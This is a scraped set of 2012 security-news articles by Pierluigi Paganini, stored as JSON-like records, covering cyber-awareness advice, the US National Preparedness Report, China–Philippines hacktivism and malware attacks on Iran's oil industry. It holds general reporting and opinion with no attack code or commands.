computer in Utah, USA in March 2012. These ongoing reports leave many of us feeling unsure on what can be done. Is this just sensationalism? How bad is the situation really? If we have a serious security problem, how do we get ourselves out of this mess? In particular, what can I do to improve my situation and protect those I care about?\n\nEach week, this easy to understand Cyber Security Awareness Series will quote cyber security insiders to answer these important questions. This four-part series is another example of international collaboration created by the ICT Gozo Malta Project, this time with experienced international security reporter Pierluigi Paganini, director and Ciso of Bit4ID, Italy. The series contributes to ongoing online publications of extensive cyber awareness resources during 2011 and 2012. These publications from Malta have been blogged and viewed by thousands of people including experts in government and industry around the globe.\n\nBelow, we quote three world-leading experts to make it absolutely clear that we do have a problem that deserves our attention, with simple suggestions on how we might respond.\n\nAccording to the US National Security Agency: \u201cThere is no such thing as \u2018secure\u2019 anymore.\u201d The ugly truth is that the majority of information and communication technology (ICT) products are fundamentally insecure and trivially broken. It is readily apparent because we are all very familiar with anti-virus and anti-spyware software, and the endless process of costly (time-consuming) security patching, often long after successful attacks, has come and gone.\n\nWhat is less understood by the wider community is that there is also an underlying problem (known by world-leading security insiders) that makes this an extremely perilous situation. That problem is that critical aspects of today\u2019s mainstream civilian cyber security ecosystem foundations are fundamentally flawed at the conceptual design, architecture and implementation levels. This includes many of the (de facto/national) security standards and security products designed to protect us from malicious activities. (See: \u201cSynaptic Labs\u2019 Annual Report On Cyber Security Technical Problems, Drivers and Incentives\u201d for the full blow-by-blow disclosure from leading experts.) This leads to a simple question: How can you make a robust, secure system with insecure building blocks?\n\nMarch 2012 \u2013UTAH DOH says 780,000 Patient Files\n\nBrian Snow is a private information security consultant with a unique insight into the situation. For 13 years, he held technical director positions in the US National Security Agency (NSA Research & Development, Information Assurance Directorate IAD, ADET). For those unfamiliar with the US NSA IAD, it\u2019s mission is to protect the US National Information and Information Systems by securing networks and making ICT systems that are less vulnerable to attacks. Prior to his technical director roles, Brian spent his first 20 years at NSA as a techie and inventor, doing and directing research on developing cryptographic components and secure systems. Many crypto systems serving the US government use his algorithms. In short, Mr Snow is one of the most authoritative and respected names in the business of securing information systems, and today he provides expert advice to the global community on how to protect ICT systems. His relentless message to security forums around the world is indisputably clear. He describes today\u2019s cyber security systems as a\n\n\u201ctrust bubble waiting to burst\u201d.\n\nTo quote Brian Snow from the 20-minute video presentation he recorded for Synaptic Labs and presented at the ICT Gozo Malta\u2019s International Cyber Awareness Seminar in November 2011 (available online free): \u201cToday\u2019s Trust Bubble products are rife with a huge pile of crippling un-addressed conceptual (design) and implementation debt. That is a one-two punch. And as were the Credit Derivative products in 2007, widely used, little understood, and less analysed! I said in March 2010 at the RSA Conference that we are ripe for a Trust Bubble meltdown with the same scale of consequences that the Credit Markets suffered. I predicted that it COULD (not WOULD) happen within three to five years, possibly even within 18 months\u2026 I now feel we may have only long weeks to short months before we COULD feel even greater pain from the immense pile of \u2018debt\u2019 (both conceptual and technical) that security vendors are carrying. Please realise, we are in desperate trouble! We have to dig out of this, or else the world economy is headed for a severe crash! We are moving at a snail\u2019s pace against an avalanche of MALICE. It is insane not to act! So I am here to tell you that your cyber systems continue to function and serve you NOT due to the EXPERTISE of your security staff, but solely due to the SUFFERANCE of your opponents.\u201d\n\nThis is not an isolated statement made by some radical. Other security experts with similar deep insight into the true extent of the problems are saying similar things.\n\nDebora A. Plunkett is today the Director of the US NSA IAD. Ms Plunkett is responsible for cyber security, cryptography and information systems security for all US national security systems. Her public view on the status of today\u2019s cyber security is very clear:\n\n\u201cThere is no such thing as `secure\u2019 anymore\u2026 We have to\u2026 assume that all the components of our system are not safe, and make sure we\u2019re adjusting accordingly.\u201d\n\nThis is a key public statement and a warning that all major organisations should take into account.\n\nMelissa Hathaway is a security expert who has held high-ranking security positions in both industry and government. Ms Hathaway is best known for leading the extremely influential US government\u2019s Cyberspace Policy Review that triggered massive change both in the US and around the world. When addressing some of the brightest minds in US cyber security at the US Oak Ridge National Laboratory\u2019s Annual Cyber Security and Information Intelligence Workshop CSIIRW 2010, she said: \u201cI think it is unconscionable that our leaders are not talking about what is really happening and some of it is because of the fear that we are going to lose trust in the core infrastructure and/or that we are going to lose public confidence.\u201d\n\nTo support Ms Hathaway\u2019s statement about the vital importance of maintaining public confidence, we quote the official UK Government Cyber Security Strategy 2011:\n\n\u201cAny reduction in trust towards online communications can now cause serious economic and social harm to the UK.\u201d\n\nSo naturally we cannot expect alarming reports to come from many government sources. Having said that, it is reassuring to learn that each of us has the ability to respond right now.\n\nAccording to Brian Snow, \u201cEach of us has the responsibility: 1. To educate ourselves on cyber security issues, 2. To find out what our individual security roles are in our business operations (and personal life), 3. To improve our skills and apply them to improve the security posture of the community, and 4. To identify what we cannot do personally and then call on the security community to deliver it.\u201d\n\nIn this article, we will focus on immediate steps each of us can take right now to mitigate the threat to ourselves, our loved ones and businesses. Thankfully, according to the UK government\u2019s Cyber Security Review (2011):\n\n\u201cPrevention is key, we will work to raise awareness and to educate and empower people and firms to protect themselves online. Eighty per cent or more of currently successful attacks exploit weakness that can be avoided by following simple best practice, such as updating anti-malware software regularly.\u201d\n\nTo start, if your computer appears to be sick (very slow or randomly misbehaving), go directly to a trusted techie, system administrator or your local computer shop and ask to have your computer checked, any malware removed, and to install a high-quality anti-virus tool if you don\u2019t have one. If your computer seems okay, make sure you are running an anti-virus tool that checks every application for malware before it runs. If the anti-virus tool continually discovers viruses, seek expert assistance immediately. Unfortunately, installing an anti-virus is not enough. Security is a daily routine of applying best practices, not something magically achieved by running an anti-virus product! The next most critical step in our daily routine is to ensure software patches for your operating system and that all applications are applied in a prompt and consistent manner. Patching removes vulnerabilities that have been discovered, preventing them from being exploited.\n\nWith the absolute minimum in place, we each still have the responsibility to educate ourselves on the other critical cyber security best practices. So be sure to read the next article in this series and join us in taking the next steps to secure (y)our world!\n\nYou can find full citations to all materials referenced in this article, and related cyber security materials including Brian Snow\u2019s presentation, at tinyurl.com/SynapticLabsAnnualReports2012.\n\nCo-author Pierluigi Paganini, Director and CISO of Bit4ID Italy has 20+ years of security experience and has many years of in-depth investigative cyber security journalism on important cyber events.

National Preparedness Report\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "May 7, 2012", "body": "The \u201cNational Preparedness Report\u201d is the first assessment, directly commissioned by President Obama, on the US capabilities of response to a terrorist attacks and man-made and natural disasters.\n\nReally interesting is the component related to cyber security, U.S. Computer Emergency Readiness Team (US-CERT) has reported an impressive growth of the number of cyber attacks and incident registered in the last five years, involving government agencies and also US businesses.\n\nPresidential Policy Directive 8 describes the Nation\u2019s response to threats and hazards that pose the greatest risk to the security of the United States requiring a an annual report summarizing the progress made toward building, sustaining, and delivering the 31 core capabilities described in the National Preparedness Goal (the Goal), the document is called National Preparedness Report (NPR). The Report addresses several areas of overall national strength identifying for them the capabilities to response to the incidents and external threats.\n\nIn this article I will detail the cyber capabilities of the US presented in the report. The following chart illustrates the core capabilities ranked by capability level, 100% would mean that all states and territories of the Nation attained their desired capability levels. The cybersecurity rank only 42% showing a worrying scenario, to contribute to a serious situation is the increasing of incidents such as cyber attacks and data breach.\n\n\n\nIn a technology era this data are really alerting, let\u2019s consider that cyber systems play a fundamental role in the public and private, the main problem is that despite this consideration the population has a low awareness regarding the cyber threats and the related risks. The cyber threats have different origin, cybercrime, foreign states and hacktivism.\n\nPrevention Capabilities are fundamental to approach the threats, in particular for cyber security great importance is given to the forensics techniques to identify the origin of the incidents. The report refers that a Cyber Action Teams, composed by technical experts, can be deployed within 72 hours to investigate cybercrimes and conduct forensic analysis.  The report, under the cyber security section, confirms the needs to protect against damage, unauthorized accesses, use and exploitation of electronic communications systems and services. Very important is also the protection of the information stored in the systems, it must be ensured the integrity, availability, or confidentiality of the data managed.\n\nNumber of cyber attacks and related  complexity have increased significantly in recent years, the U.S. Computer Emergency Readiness Team (US-CERT) reported an over 650-percent increase in the number of cyber incidents reported by federal agencies over a five-year period, passing from 5,503 in 2006, to 41,776 in 2010.  In the following chart are proposed the specific threat or hazard for each of the 31 core capabilities identified by states and territories. The events that could stress the capabilities of the country are for natural hazards, earthquakes and hurricanes, while the man made threats the most worrying are cyber attacks and radiological dispersion device/nuclear attacks topped the list.\n\n\n\nVery worrying is the impact of the cyber threats on the private sector, almost two-thirds of U.S. firms have been the victim of cyber security incidents or information breaches. Concerning is also the approach to the incidents, the response to this kind of events must be improved, consider that only 50 percent of owners of response operations report cyber incidents to external parties, a behavior that could trigger a domino effect with unpredictable effect in different sectors.\n\nCybersecurity must be identified as a priority issue to enhance the efficiency of the prevention and the response to any kind of incidents. The reports invites federal and private sector partners to accelerate initiatives to enhance data collection, detect events, raise awareness, and respond to cyber incidents.\n\nAt least 10 different critical infrastructure sectors have established joint public-private working groups through the SCCs and GCCs focused on cyber issues.  \n\nThe report presents the role assumed by government agencies such as DHS and DOD and their support to the development of cyber strategy. Assessment programs, audit of critical infrastructures, definition of best practices and tools for the audit of sensible systems and networks are key component in the fight to the cyber threats.\n\nIn some activities, like monitoring of cyber attacks, the program seems to have reached excellent results, consider in fact that by the end of 2011, the National Cybersecurity Protection System was monitoring cyber intrusions with advanced technology for 37 of 116 federal agencies (32 percent), overcoming the proposed target of 28 percent.\n\nFundamental is the cooperation between these organization, DHS and DOD for example are jointly undertaking a proof-of-concept called the Joint Cybersecurity Services Pilot. The purpose of the partnership is to define a pilot program to enhance the cybersecurity of participating Defense Industrial Base (DIB) critical infrastructure entities and to protect sensitive DOD information and DIB intellectual property that directly supports DOD missions or the development of DOD capabilities from unauthorized access, exfiltration, and exploitation.\n\nThe report also provides some useful information regarding the main activities of the principal government office that operate for the national cyber security, the most operative are:\n\nDespite the great effort spent in cyber security by US and the progress achieved in the recent year, the report shows that cyber capabilities are lagging at the state level, with an average capability level of 42 percent.\n\n\n\nOther data are really worrying on the situation, the non-uniformity of the cyber capabilities in the country and also the gaps in cyber-related preparedness among 162 state and local entities. In this phase we can say that the Nation is aware of the cyber threats and related risks but too much is still to reach a satisfactory level of capabilities.\n\nIn several articles I have alerted on this complicated situation that is common also to several European States, too many critical infrastructures are still vulnerable and the processes to secure them are still too slow to implementation level. This means that we face a situation where, despite efforts, we are serious risks of exposure to cyber threats.\n\nPersonally I appreciate the report that I think is an expression of high maturity in security, an example for all to follow. Obviously it is desirable that highlighted vulnerabilities will be mediated, as soon as possible, also thanks to the strong commitment that wanted this study.\n\nPierluigi Paganini\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/critical-infrastructures", "topic_name": "Critical infrastructures"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-threats", "topic_name": "cyber threats"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cybercrime", "topic_name": "Cybercrime"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cybersecurity", "topic_name": "Cybersecurity"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/data-breach", "topic_name": "data breach"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/dhs", "topic_name": "DHS"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/fbi", "topic_name": "FBI"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacktivism", "topic_name": "Hacktivism"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/national-preparedness-report", "topic_name": "National Preparedness Report"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/us", "topic_name": "US"}]}, {"news_name": "China vs Philippines, cyber war or hacktivism?", "news_link": "https://securityaffairs.co/wordpress/4899/intelligence/china-vs-philippines-cyber-war-or-hacktivism.html", "title": "China vs Philippines, cyber war or hacktivism?\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "May 3, 2012", "body": "In this period the cyber space is a place in full swing, international attention is focused on Iran and its quarrel with the West, but other silent battles are being fought. In the last month has been registered a surprising activity that opposes China and Philippines, continuous and reciprocal attacks attack to the sound of bits and byte have been conduced, are we facing with a cyber conflict?\n\nThe Chinese engagement in cyberspace isn\u2019t a surprise, it\u2019s new the discover of the aggressive approach of Philippine cyber army that has decided to measures its capabilities with the giant China.\n\nWhich are the reasons of the attacks?\n\nOrigin of the battle a territorial dispute between China and Philippines over the Scarborough Shoal and the Spratlys Island.  The crisis has been accentuated by a Chinese military action that sent military vessel in the area on April 7, 2012. It is the fifth times where China intruded the Philippine Territory since June 2011, its military has cross Philippine vessels in the following places:\n\n \n\n\n\nChina is interested to the territories and has proposed the pretext of protecting its fishermen and seismic surveyors.  The real interest seems to be to trespass into Philippine offshore oilfields and to claim exclusivity of fishing in those areas close to the country.  In contrast to Manila\u2019s stance, China has decide to adopt a military option moving its naval fleet to send a clear message not only to the Philippines but also the other Asian members such as Japan, South Korea, India, Australia, and America of course.\n\nLet us see the time line of the events proposed by the precious colleague Paolo Passeri on his blog.\n\n\n\nPrior to the April 20 there were no attacks recorded, but suddenly a group of Chinese hackers have targeted the University of the Philippines defacing the website (up.edu.ph) with a map with Chinese characters, reproducing the Scarborough Shoal. The event has triggered a series of reciprocal attacks despite the invitation to ease the tension made by Philippines Deputy presidential spokesperson Abigail Valte. Government of Manila is convinced that similar attacks could have critical effect on the difficult relation with China compromising the diplomatic dialogue.\n\nTo date no attacks have brought significant damage to infrastructures, limiting to deface opponents web sites, however, it is expected an escalation of the phenomena and of operations that can cause more serious damage.\n\nWhen I speak of cyber warfare and cyber attacks I always think on how crucial is the defense of critical infrastructures. Chines Government has the capabilities to infiltrate foreign networks attacking focal points of the enemy country.  We have learnt that a cyber weapons could cause similar damage of a conventional weapon,  due the exposed reflections I believe the hacking operation moved against Philippines are made by non state-sponsored groups.\n\nAnother hypothesis, which I believe, however implausible, is that the Beijing government intends to measure the actual capacity computer opponents, but the noise produced with these attacks will not let me lean towards this possibility.\n\nA final consideration is far from negligible impact of the phenomenon of hacktivism a precarious situation that let me think that the attacks against the Chinese cannot be linked to the Beijing government. In the last months Anonymous groups has declared war to China and its media censorship promoting the operation called #OpChinaDown.\n\nAttacks against China and related to the Philippine situation seems have involved other groups of hacktivist linked to Anonymous, like PrivateX, in operation called #OccupyPhilippines. It\u2019s clear that for every government, also for Chinese one, the cyber fight against hacktivism is expensive.\n\nSo, why Chinese Government has attacked The Philippines in cyberspace attracting attention of hacktivism?\n\nIt\u2019s clear that the real origin is different.\n\nI conclude by recalling that in spite of things like this may seem minor, give us a clear picture of the real situation of conflicts and disputes between people. As I have often stressed, analyzing cyberspace it is now possible to understand the real political intentions of a country.\n\nPierluigi Paganini\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/anonymous", "topic_name": "Anonymous"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/censorship", "topic_name": "Censorship"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/china", "topic_name": "China"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/critical-infrastructures", "topic_name": "Critical infrastructures"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-threat", "topic_name": "cyber threat"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-threats", "topic_name": "cyber threats"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-war", "topic_name": "cyber war"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyberwarfare", "topic_name": "cyberwarfare"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacktivism", "topic_name": "Hacktivism"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/intelligence", "topic_name": "Intelligence"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/iran", "topic_name": "Iran"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/opchinadown", "topic_name": "OpChinaDown"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/philippines", "topic_name": "Philippines"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/warfare", "topic_name": "warfare"}]}, {"news_name": "Fear Iran and escalation of cyber attacks", "news_link": "https://securityaffairs.co/wordpress/4799/intelligence/fear-iran-and-escalation-of-cyber-attacks.html", "title": "Fear Iran and escalation of cyber attacks\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "April 30, 2012", "body": "Last week I reported the virus attack to the Iranian oil industry, a cyber attack that seems has caused few damages but that raised again the theme of cyber warfare. Oil industry is the primary economic business of Iranian Government and an attack to the sector appears to the experts as a cyber war acts. In the past Iran was already victim of cyber attack to its nuclear plants, we all remember the case of the Stuxnet Virus, for this reason the Iranian intelligence is convinced that also this time the nation is facing with a new cyber attack. Iran has in great consideration the theme of cyber warfare and it government is making big investments to strengthen the technological structure of the country and to promote effective cyber strategy.\n\nImmediate reaction to the incident, on Saturday Iranian oil ministry\u2019s cyber team has identified the targets of the attack and also the responsibles. Despite the Iranian officials haven\u2019t revealed the identity of the responsibles they have provided more information regarding the attack and the real damages, they have in fact confirmed a virus has hit the structures of Kharg Island plant destroing minor data and some user\u2019s hard disks. For all the data infected the experts have a copy of backup that has been restored without problems.\n\n\u201cThe nature of the attack and the identity of the attackers have been discovered, but we cannot publicize it since we are still working on the case,\u201d\n\nDeputy Oil Minister Hamdollah Mohammadnejad told FNA.\n\n\u201cthe attack was carried out by virus penetration and was aimed at stealing and destroying data and information.\u201d\n\nThe spokesman\u2019s words are eloquent, the attack hasn\u2019t had the sole intent to destroy data, but it is part of a complex strategy that aims to infiltrate the Iranian networks gathering sensible information.\n\n\u201cthose who design and develop such viruses are pursuing specific goals\u201d.\n\nObviously there is the announcement in tones of propaganda immediate resumption of operations at the site attacked, senior Iranian oil ministry officials announced earlier this week said their computer systems resumed normal operation on Wednesday.\n\nIranian Oil Ministry\u2019s Spokesman Alireza Nikzad-Rahbar declared that main services of the ministry\u2019s computer systems, including the Administrative Automation System were up again on Tuesday evening, and that all the Iranian government experts have adopted all precautions to minimize the impact of a cyber attack ensuring the business continuity.\n\nIranian government is aware of the destructive capabilities of cyber weapons and the importance of appropriate cyber strategy, rather it is believed that in this area, the Western enemy may be more vulnerable. On March 2012 the leader of the Islamic Revolution Ayatollah Seyyed Ali Khamenei has tasked Iranian President Mahmoud Ahmadinejad with the duty of establishing a Supreme Council of Cyberspace which is charged with protecting the Iranian cyberspace\n\nThe registered attack is not the only one against Iranian infrastructures, Iranian Sharg newspaperhas reported that hackers have attacked the computers of Iran\u2019s ministry of science, of course also this time there aren\u2019t damage. Iranian expert also in this occasion have noted that the hackers haven\u2019t the only purpose to destroy data but they were more interested to steal information.\n\nAn analysis of activities in cyber space clear the escalation of cyber conflict in the Middle East with Israel as the main protagonists, and the emerging Iran and Lebanon. The detailed Middle East Cyber War Timeline is available on the web site of the collegue Paolo Passeri, following a brief list of the events.\n\n\n\nThe intensification of the attacks provides an indicator of the level of tension in the area, and portends a military intervention to date avoided only by the veto of countries like China and Russia backing the government in Tehran. The intense activity also impacts on the policies of leading western nations, U.S. in the lead. The Iran issue is beginning to worry the American government, and not only, that through a media campaign is trying to rally support for military intervention in the area. Attempts of diplomacy did not match the expected results allowing the government in Tehran to organize an alarming strategy. Recall that world experts believe that Iran can have its own nuclear arsenal within two years, this time the West will have to decide how to act and procede.\n\nVery significant is the report \u201cThe Iranian Cyber Threat to the U.S. Homeland\u201d Statement before the U.S. House of Representatives Committee on Homeland Security Subcommittee on Cybersecurity, Infrastructure Protection, and Security Technologies and Subcommittee on Counterterrorism and Intelligence. In the document are analyzed the growing Iranian capabilities, the country expanding exploitation of cyberspace can be attributed to two principal geopolitical drivers:\n\nThe report clarify the position of Teheran that is considering itself engaged in a cyber war with West, due this reason the Iranian regime is mobilizing in response launching an ambitious $1 billion governmental program to boost national cyber capabilities, acquiring new technologies, investing in cyber defense, and creating of a new army of cyber experts.\n\nWhere does the United States stand with regard to a response? The Obama administration has made cybersecurity a major area of policy focus since taking office in 2009, and the past year in particular has seen a dramatic expansion of governmental awareness of cyberspace as a new domain of conflict.\n\nThe U.S. government, in other words, has not yet even begun to get ready for cyberwar with Iran, and according the report it\u2019s time to start it. The risk of attacks against infrastuctures located in US homeland is high and it will increase in coming months due a range of scenarios, from a renewed diplomatic impasse to a further strengthening of economic sanctions to the use of military force against Iranian nuclear facilities.\n\nPierluigi Paganini\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/critical-infrastructures", "topic_name": "Critical infrastructures"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-attack", "topic_name": "cyber attack"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-attacks", "topic_name": "Cyber attacks"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-strategy", "topic_name": "cyber strategy"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-threat", "topic_name": "cyber threat"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-warfare", "topic_name": "cyber warfare"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-weapon", "topic_name": "cyber weapon"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-weapons", "topic_name": "cyber weapons"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyberwarfare", "topic_name": "cyberwarfare"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hackers", "topic_name": "Hackers"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/intelligence", "topic_name": "Intelligence"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/iran", "topic_name": "Iran"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/iranian-oil-industry", "topic_name": "Iranian oil industry"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/israel", "topic_name": "Israel"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/russia", "topic_name": "Russia"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/stuxnet", "topic_name": "stuxnet"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/virus", "topic_name": "virus"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/warfare", "topic_name": "warfare"}]}, {"news_name": "Iran vs West, cyber war or media conflict?", "news_link": "https://securityaffairs.co/wordpress/4737/intelligence/iran-vs-west-cyber-war-or-media-conflict.html", "title": "Iran vs West, cyber war or media conflict?\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "April 27, 2012", "body": "Today I have read several articles where is hypothesized an imminent cyber attacks of Iran cyber army against US infrastructures, this news seems alarming the international community. Are we close to a military attack of Iran? Why this news is circulating so closely?\n\nSources of intelligence report to Congress on Thursday that Iran is recruiting a hacker army to target the U.S. for cyber attack against critical infrastructures such as power grid and water systems. Counterterrorism and Intelligence Subcommittee Chairman Pat Meehan, R-Pa declared:\n\n\u201cIf Iran is willing to blow up a Washington restaurant and kill innocent Americans, we would be naive to think Iran would never conduct a cyberattack against the U.S. homeland,\u201d \n\nmeanwhile Ilan Berman, vice president of the hawkish American Foreign Policy Council, said\n\n\u201cOver the past three years, the Iranian regime has invested heavily in both defensive and offensive capabilities in cyberspace,\u201d \n\n\u201cFor the Iranian regime the conclusion drawn from Stuxnet is clear: War with the West, at least on the cyberfront, has already been joined, and the Iranian regime is mobilizing,\u201d\n\n\n\nThe growing tension between Iran, the U.S. and Israel do not bode well, however these reports persistently circulated in internet don\u2019t add anything new to a scenario that has long been known. Iran has understood how much strategic is a strong presence in cyber space, just in this new battle field it has found vulnerable many of its opponents deciding to invest in cyber warfare.  The Washington Times reported some issues contained in the relation presented to the two House Homeland Security subcommittee. The security experts are convinced that Iran is arranging a very offensive cyber army composed by different cells of hackers ready to move cyber attacks against the enemies.\n\nBut also this news is known the security sector, last year I wrote\n\nThe Iranian Revolutionary Guards Corps, IRGC, seems to have built one of the largest forces of hackers on the planet. \u201cEmperor\u201d, \u201cIran Hackers Sabotage\u201d these are the names of the main group of hackers that during the last year have conducted several operation like destroy a government database or hack into two candidates\u2019 websites. during the 2005 presidential election.\n\nIn May 2010, Ebrahim Jabbari, a provincial Revolutionary Guards commander, declared that the IRGC had the world\u2019s second-largest cyber army at its disposal, the US intelligence is convinced of the potential of groups to the point of recognizing them as among the major cyber threats to the country.\n\nIn addition to cyber warriors and mercenaries, the Iran regime also has the control of the private IT firm Ashiyane Security Group, which has coordinated several cyber-attacks from Iran. Its illustrious victims are Mossad, Mossad, defence minister Ehud BarakNASA and several websites in the Arab world.\n\nOf course I do not work for intelligence, but I\u2019ve written before news that today someone would use as a pretext for a military attack. I think it is began a dangerous campaign the search for consensus on a military attack against Iran.\nOn one thing there can be no doubt, Iran is a dangerous country that has substantial financial resources, the proceeds of the oil market which is a leader, and that deeply hates the West and its policies. The military option is strongly supported in the U.S. and Israeli military echelons, give time to the government in Tehran would give it the opportunity to increase his attack power.\n\nAccording to Frank J. Cilluffo, director of the Homeland Security Policy Institute at George Washington University,\n\n\u201d due the high availability of cyber weapons on black market \u201cadversaries do not need capabilities, just intent and cash.\u201d, \n\nand Iran has both.\n\n\u201cIran has a long history of demonstrated readiness to employ proxies for terrorist purposes,\u201d he also added  \u201cThere is little, if any, reason to think that Iran would hesitate to engage proxies to conduct cyber strikes against perceived adversaries.\u201d\n\n\u201cWe know that [the Iranians] will do something if they feel cornered,\u201d\n\ndeclared Rep. Patrick Meehan, R-Pa., chairman of the subcommittee on counterterrorism and intelligence.\n\n\u201cWe know they have a capacity, and I think it\u2019s realistic to try to assess the scope of that.\u201d\n\nU.S. intelligence officials declined to comment further on Iranian cyber capabilities, though they acknowledge the threat in general terms.\n\nAll the experts agree that Iran has dramatically increased its cyberwar capabilities, despite this consideration there is no evidence that Iran will use them against the US for striking attacks. A single attack could start the military reply of US and Israele that despite the Iranian propaganga is a dreaded event for Teheran Government.\n\n\u201cLike most nation-states, [Iran] may want to develop a cyber capability for the same reason it would want a nuclear capability \u2014 as a shield,\u201d says retired Marine Gen. James Cartwright, the former vice chairman of the Joint Chiefs of Staff.\n\nIranian Government is working on different fronts in my opinion, on one side it\u2019s recruiting internal hackers in the name of religious motivations, on the other hand it is acquiring knowledge from mercenaries hackers coming from East Europe and also from Asia. It will no difficult for Iran to prepare its own cyber arsenal, and these cyber weapons could hit vulnerable western critical infrastructures.\n\nLast and most important aspect that we must consider are the alliances that Iran has with Russia and China. These countries for several reasons are interested that Iran will mantains its stategic position. The oil and conventional weapon markets are just a couple of the these motivation, the presence of Iran is necessary to avoid the further infiltration of western legions.Thanks to these alliances Iran enjoys political and technology support of two major world powers, so I think unlikely an imminent military attack on Iran. The way of diplomacy satisfies all, at this moment. We will assist to continuous and bilateral attacks between Iran and the Western countries, waiting for events mutate unpredictably.\n\nWhat could push the U.S. in a military operation?\n\nAn attack on American soil, whether conventional or conducting with a cyber attack, or the evidence, recognized by the international governments, that Tehran is really close to the establishment of a nuclear arsenal. The decision to attack should be taken as soon as possible, no more of two years, acting firmly and not spreading news like those with which I began the article with the sole purpose of gathering consents.\n\nThe risk of a cyber attack is high, however the likelihood is not changed in recent months.A growing number of nations are taking steps in this direction by investing in cyberwarfare, today it is Iran which country will be tomorrow?\n\nPierluigi Paganini\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/attack", "topic_name": "attack"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/china", "topic_name": "China"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/conflict", "topic_name": "conflict"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/critical-infrastructures", "topic_name": "Critical infrastructures"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-attack", "topic_name": "cyber attack"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-threat", "topic_name": "cyber threat"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-warfare", "topic_name": "cyber warfare"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyberattack", "topic_name": "cyberattack"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyberwar", "topic_name": "cyberwar"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacker-army", "topic_name": "hacker army"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/iran", "topic_name": "Iran"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/russia", "topic_name": "Russia"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/west", "topic_name": "West"}]}, {"news_name": "Iran,Oil Industry under cyber attack,are we close to a military strike?", "news_link": "https://securityaffairs.co/wordpress/4654/intelligence/iranoil-industry-under-cyber-attackare-we-close-to-a-military-strike.html", "title": "Iran,Oil Industry under cyber attack,are we close to a military strike?\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "April 24, 2012", "body": "A new cyber attack against Iran, in particular this time the Oil Industry was the target of a Malware Attack. The news was widespread by Officials in the Iranian oil ministry, they say that their network and the country\u2019s main oil export terminal were infected with a malware; due this event the government has taken temporarily systems offline. An instance of the virus used for the attacks was found in the control systems of Kharg Island, the place provides a sea port for the export of oil and extends Iranian territorial sea claims into the Persian Gulf. The operations inside the terminal continued, no recording interruption due to the attack. According Iranian officials only one server was compromised, it was used to provide public information.\n\nWe all remember that the nation in 2010 was victims of another cyber attack, when the Stuxnet worm infected control systems inside nuclear plant in Iran. worldwide experts recognized in Stuxnet agents a powerful cyber weapon used to stop the nuclear program of the Iranian government. Immediately, experts have thought of that episode was related to the discovery made in recent months of a platform for the creation of similar cyber weapons, the \u201cTilded Platform\u201c, assuming that the new virus was created by the same team.  The first news reported in security sector say that the malware used in the attack is not related to Stuxnet, so meanwhile the Stuxnet was developed by foreign governments to attack the Iran, at the moment it\u2019s impossible to make hypothesis on the source of the malware. According the declaration of an Iranian oil ministry spokesperson the virus attacks has infected public servers that were immediately isolated, no particular damage were reported.\n\nThe Mehr News Agency revealed the National Iranian Oil Company and other businesses were under attack on Sunday 22th April, no information has been exposed and the attacks were successfully mitigated. 